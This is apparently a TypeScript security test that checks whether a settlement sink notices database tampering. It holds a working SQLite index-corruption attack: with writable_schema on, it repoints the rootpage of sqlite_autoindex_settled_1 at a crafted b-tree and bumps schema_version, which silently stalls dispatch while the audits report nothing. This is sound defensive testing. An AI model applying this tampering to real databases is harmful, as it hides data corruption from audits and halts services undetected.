// a5: the schema check compares (type, name, tbl_name, sql) of sqlite_schema, NOT rootpage, and nothing runs
// PRAGMA integrity_check. Attacker: database file writer (here through SQLite with writable_schema), no key, no
// config, sink stopped. The attacker points sqlite_autoindex_settled_1 at a crafted index b-tree that holds every
// settled entry, with the key of r1 changed to 'r1x' (so COUNT(DISTINCT) is unchanged; orphan pages left behind). The table rows are unchanged.
// Then: start-up audit; offline audit(); a new honest commit r3; dispatcher flush (it has not yet dispatched).
// Also, the lookup that the sink's commit uses (WHERE request_id = ?) for r1.
// Exit 1 = defect present: the sink starts and its offline audit is empty, while the dispatcher cannot dispatch r1
// and every later row (stealth stop that no sink check reports). 0 = safe. 3 = harness error.
import { DatabaseSync } from "node:sqlite";
import { setup, Sink, S0 } from "./common";
const [work] = process.argv.slice(2);
(async () => {
  const h = await setup(work);
  const log: any = {};
  let sink = new Sink(h.db, h.cfg); sink.init(S0);
  log.c1 = sink.commit(await h.mint(S0, "r1", "100"));
  log.c2 = sink.commit(await h.mint(JSON.parse(sink.stateBlob()), "r2", "200"));
  sink.close();
  // ---- attacker
  const a = new DatabaseSync(h.db);
  a.exec("CREATE TABLE d(seq INTEGER PRIMARY KEY, request_id TEXT NOT NULL UNIQUE); INSERT INTO d SELECT seq, CASE WHEN request_id = 'r1' THEN 'r1x' ELSE request_id END FROM settled;");
  const root = (a.prepare("SELECT rootpage FROM sqlite_schema WHERE name = 'sqlite_autoindex_d_1'").get() as any).rootpage;
  const sv = (a.prepare("PRAGMA schema_version").get() as any).schema_version;
  a.exec("PRAGMA writable_schema = ON");
  a.prepare("UPDATE sqlite_schema SET rootpage = ? WHERE name = 'sqlite_autoindex_settled_1'").run(root);
  a.exec("DELETE FROM sqlite_schema WHERE tbl_name = 'd'");
  a.exec(`PRAGMA schema_version = ${sv + 1}`);
  a.exec("PRAGMA writable_schema = OFF");
  a.close();
  const q = new DatabaseSync(h.db, { readOnly: true });
  log.lookupR1 = q.prepare("SELECT token_sha256 FROM settled WHERE request_id = ?").get("r1") ?? null;
  log.scanR1 = (q.prepare("SELECT COUNT(*) AS n FROM settled WHERE request_id || '' = 'r1'").get() as any).n;
  log.integrity = (q.prepare("PRAGMA integrity_check").all() as any[]).map(r => r.integrity_check).slice(0, 3);
  q.close();
  // ---- sink restart
  try { sink = new Sink(h.db, h.cfg); log.restart = "serves"; } catch (e) { log.restart = String((e as Error).message); h.stop(); console.log(JSON.stringify(log)); process.exit(0); }
  log.offlineAudit = sink.audit();
  log.c3 = sink.commit(await h.mint(JSON.parse(sink.stateBlob()), "r3", "300"));
  const f = h.flush(); log.f = { emitted: f.emitted.map((e: any) => e.requestId), refused: f.refused.map((r: any) => r.requestId + ": " + r.reason) };
  sink.close(); h.stop();
  console.log(JSON.stringify(log));
  process.exit(log.restart === "serves" && log.offlineAudit.length === 0 && f.emitted.length === 0 ? 1 : 0);
})().catch(e => { console.error(String(e && e.stack)); process.exit(3); });
